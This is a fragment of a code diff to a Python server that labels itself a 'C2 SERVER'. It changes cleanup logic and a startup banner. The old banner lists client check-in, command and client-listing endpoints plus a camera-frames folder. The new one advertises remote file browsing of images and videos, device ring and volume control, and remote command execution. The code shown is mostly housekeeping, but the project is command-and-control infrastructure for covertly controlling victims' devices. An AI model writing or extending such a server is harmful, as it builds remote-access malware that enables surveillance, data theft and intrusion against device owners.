             conn.close()
-            
-            if deleted_clients or deleted_commands or deleted_files:
-                print(f"[🗑️] Cleanup: {deleted_clients} clients, {deleted_commands} commands, {deleted_files} files")
             
         except Exception as e:
             print(f"[✗] Cleanup error: {e}")
@@ -761,32 +905,27 @@ if __name__ == '__main__':
     init_db()
     
     # Start cleanup thread
-    threading.Thread(target=cleanup_old_data, daemon=True).start()
+    threading.Thread(target=cleanup, daemon=True).start()
     
     app_start_time = time.time()
     
     print(f"""
 ╔══════════════════════════════════════════════════════════╗
-║                C2 SERVER v2.1 - STATUS FIXED            ║
-║               Proper Client Status Tracking             ║
+║              SIMPLE C2 SERVER v1.0                      ║
+║           File Viewing & Device Control                 ║
 ╚══════════════════════════════════════════════════════════╝
 
     📊 Database: {DATABASE}
-    📁 Uploads: ./uploads/
-    📷 Camera: ./camera_frames/
+    📁 Uploads: {UPLOAD_FOLDER}/
     
-    ⚡ Online Threshold: {ONLINE_THRESHOLD} seconds
-    🗑️ Cleanup Interval: {CLEANUP_INTERVAL} seconds
+    🎯 Features:
+    • 📁 File browser (images/videos)
+    • 🔔 Device ring/beep control
+    • 🔊 Volume control
+    • 🖥️ Remote command execution
     
-    🔗 Server running on: http://0.0.0.0:5000
-    📡 API ready for connections
-    
-    Endpoints:
-    • POST /api/checkin     - Client checkin (fixed)
-    • POST /api/command     - Send command
-    • GET  /api/clients     - List clients (accurate status)
-    • GET  /api/stats       - Detailed statistics
-    • GET  /api/health      - Health check
+    🔗 Server: http://0.0.0.0:5000
+    📡 API Ready
     
     Starting server...
     """)
